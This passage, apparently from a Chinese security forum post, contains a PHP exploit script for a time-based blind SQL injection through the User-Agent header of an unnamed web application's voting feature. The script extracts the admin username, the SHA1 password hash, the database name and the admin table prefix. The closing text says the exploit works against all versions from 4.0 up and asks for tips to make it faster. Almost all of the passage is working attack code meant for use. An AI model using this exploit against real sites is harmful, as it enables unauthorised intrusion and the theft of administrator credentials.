+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $starttime = getmicrotime (); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $rs = DoGet ( $header, $postdata ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $endtime = getmicrotime (); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($endtime - ($starttime) &gt;= $tout) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "成功:" . $ColName . "第" . $poss . "位＝＝" . $checkchr . " -耗时:" . ($endtime - $starttime) . "秒\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $checkchr; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;  <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; return false; <br />
+} <br />
+function checkLove() { <br />
+&nbsp;&nbsp;&nbsp; Global $tout, $postdata; <br />
+&nbsp;&nbsp;&nbsp; $header = "User-Agent: Mozilla/4.0','1292169300',IF((select 1)=1,concat('wo',sleep($tout),'wo'),'Wowo'))#"; <br />
+&nbsp;&nbsp;&nbsp; $starttime = getmicrotime (); <br />
+&nbsp;&nbsp;&nbsp; $rs = DoGet ( $header, $postdata ); <br />
+&nbsp;&nbsp;&nbsp; $endtime = getmicrotime (); <br />
+&nbsp;&nbsp;&nbsp; if ($endtime - ($starttime) &gt;= $tout) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true; <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; return false; <br />
+} <br />
+function makelove() { <br />
+&nbsp;&nbsp;&nbsp; if (checkLove () === false) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "漏洞测试失败\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit (); <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; echo "开始以默认表前缀猜解........\n"; <br />
+&nbsp;&nbsp;&nbsp; $sql = "\$header = \"User-Agent: Mozilla/4.0','1292169300',IF((select CHAR_LENGTH(\$ColName) from `\" . \$tlb_tag . \"admin` where `admin_permissions`='all' and `admin_state`='1' LIMIT 1)=\$i,concat('wo',sleep(\$tout),'wo'),'Wowo'))#\";"; <br />
+&nbsp;&nbsp;&nbsp; $name_len = GetLen ( "admin_name", $sql ); <br />
+&nbsp;&nbsp;&nbsp; if ($name_len !== false) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = "\$header = \"User-Agent: Mozilla/4.0','1292169300',IF((select MID(\$ColName,\$poss,1) from `\" . \$tlb_tag . \"admin` where `admin_permissions`='all' and `admin_state`='1' LIMIT 1)='\$checkchr',concat('wo',sleep(\$tout),'wo'),'Wowo'))#\";"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $admin_name = GetTxt ( "admin_name", $name_len, $sql ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "admin_name: $admin_name\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $admin_password = GetTxt ( "admin_password", 40, $sql ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo " admin_password:$admin_password\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo $admin_name, "&nbsp; ----&nbsp; ", $admin_password; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit (); <br />
+&nbsp;&nbsp;&nbsp; } else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "默认表前缀猜解失败,开始自动猜解表前缀,正在获取mysql版本号........\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = "\$header = \"User-Agent: Mozilla/4.0','1292169300',IF((select MID(VERSION(),1,1) )='\$checkchr',concat('wo',sleep(\$tout),'wo'),'Wowo'))#\";"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $mysql_ver = GetChr ( "FuckVersion", 1, $sql ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo " mysql_ver:$mysql_ver\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($mysql_ver &gt;= 5) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "mysql版本&gt;=5.0 ,开始猜解表前缀\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = "\$header = \"User-Agent: Mozilla/4.0','1292169300',IF((select CHAR_LENGTH(DATABASE()))=\$i,concat('wo',sleep(\$tout),'wo'),'Wowo'))#\";"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $database_len = GetLen ( "FuckDatabaseLength", $sql ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "database_len: $database_len&nbsp; ，成功获取数据库名长度。\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($database_len !== false) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = "\$header = \"User-Agent: Mozilla/4.0','1292169300',IF((select MID(DATABASE(),\$poss,1))='\$checkchr',concat('wo',sleep(\$tout),'wo'),'Wowo'))#\";"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $database_name = GetTxt ( "FuckDatabase", $database_len, $sql ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "database_name: $database_name ，成功获取数据库名。\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($database_name !== false) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = "\$header = \"User-Agent: Mozilla/4.0','1292169300',IF((select count(*)&nbsp; from `INFORMATION_SCHEMA`.`TABLES` where `TABLE_SCHEMA` = '$database_name' and `TABLE_TYPE` = 'BASE TABLE' and `TABLE_NAME` LIKE '%admin')=\$i,concat('wo',sleep(\$tout),'wo'),'Wowo'))#\";"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $tbl_count = GetLen ( "FuckTableCount", $sql ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($tbl_conut !== false &amp;&amp; $tbl_count == 1) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "发现一个管理员表,正在获取表前缀...\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = "\$header = \"User-Agent: Mozilla/4.0','1292169300',IF((select CHAR_LENGTH(TABLE_NAME)&nbsp; from `INFORMATION_SCHEMA`.`TABLES` where `TABLE_SCHEMA` = '$database_name' and `TABLE_TYPE` = 'BASE TABLE' and `TABLE_NAME` LIKE '%admin')=\$i,concat('wo',sleep(\$tout),'wo'),'Wowo'))#\";"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $tbl_len = GetLen ( "FuckTableLength", $sql ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($tbl_len !== false) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = "\$header = \"User-Agent: Mozilla/4.0','1292169300',IF((select MID(TABLE_NAME,\$poss,1)&nbsp; from `INFORMATION_SCHEMA`.`TABLES` where `TABLE_SCHEMA` = '$database_name' and `TABLE_TYPE` = 'BASE TABLE' and `TABLE_NAME` LIKE '%admin')='\$checkchr',concat('wo',sleep(\$tout),'wo'),'Wowo'))#\";"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //echo $sql;exit; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $tbl_name = GetTxt ( "FuckTable", $tbl_len, $sql ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($tbl_name !== false) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $tlb_tag = str_ireplace ( "admin", "", $tbl_name ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $GLOBALS ['tlb_tag'] = $tlb_tag; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "tlb_tag: $tlb_tag ,成功获取表前缀,正在自动重试。.....\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; makelove (); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit (); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "尝试获取表名失败...\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "尝试获取第表长度失败...\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit (); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else if ($tbl_conut !== false &amp;&amp; $tbl_count &gt; 1) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "发现多个管理员表,正在获取表前缀...\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for($i = 0; $i &lt; $tbl_count; $i ++) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = "\$header = \"User-Agent: Mozilla/4.0','1292169300',IF((select CHAR_LENGTH(TABLE_NAME)&nbsp; from `INFORMATION_SCHEMA`.`TABLES` where `TABLE_SCHEMA` = '$database_name' and `TABLE_TYPE` = 'BASE TABLE' and `TABLE_NAME` LIKE '%admin' LIMIT $i,1)=\$i,concat('wo',sleep(\$tout),'wo'),'Wowo'))#\";"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $tbl_len = GetLen ( "FuckTableLength", $sql ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($tbl_len !== false) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $sql = "\$header = \"User-Agent: Mozilla/4.0','1292169300',IF((select MID(TABLE_NAME,\$poss,1)&nbsp; from `INFORMATION_SCHEMA`.`TABLES` where `TABLE_SCHEMA` = '$database_name' and `TABLE_TYPE` = 'BASE TABLE' and `TABLE_NAME` LIKE '%admin' LIMIT $i,1)='\$checkchr',concat('wo',sleep(\$tout),'wo'),'Wowo'))#\";"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //echo $sql;exit; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $tbl_name = GetTxt ( "FuckTable", $tbl_len, $sql ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($tbl_name !== false) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $tlb_tag = str_ireplace ( "admin", "", $tbl_name ); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $GLOBALS ['tlb_tag'] = $tlb_tag; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "tlb_tag: $tlb_tag ,成功获取多个表前缀,请手工重试。.....\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "尝试获取第" . $i . "表名失败...\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "尝试获取第" . $i . "表长度失败...\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit (); //循环猜解结束。 <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "尝试获取表数失败...\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit (); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "尝试获取数据库名失败....\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit (); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "尝试获取数据库名长度失败....\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit (); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else if ($mysql_ver &gt;= 1 &amp;&amp; $mysql_ver !== false) { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "mysql版低于5.0放弃猜解表前缀。\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit (); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else { <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo "获取mysql版本失败。\n"; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit (); <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; } <br />
+&nbsp;&nbsp;&nbsp; echo "not found -_- || \n"; <br />
+&nbsp;&nbsp;&nbsp; exit (); <br />
+} <br />
+makelove (); <br />
+?&gt;</P></TD></TR></TBODY></TABLE></P>
+<P align=left>实际效果：</P>
+<P align=center><IMG height=415 src="/File.asp?md5=beae979aae597bf515efbccfd15b9c66" width=657 border=0></P>
+<P align=left>&nbsp;&nbsp;&nbsp; 通杀 4.0+ 以上版本，不过其程序采用的是SHA1加密。EXP利用时间差进行盲注。由于是投票所以在比对失败的情况下，让语句出错，不然如果不出错成功入库后，就不能继续猜解了，成功就会调用sleep睡眠产生时间差。</P>
+<P align=left>&nbsp;&nbsp;&nbsp; 该EXP实际效果会受网络环境影响，另外没有写自动猜解中文用户名的功能。希望高手们指点一下。怎样写比较高效。</P>
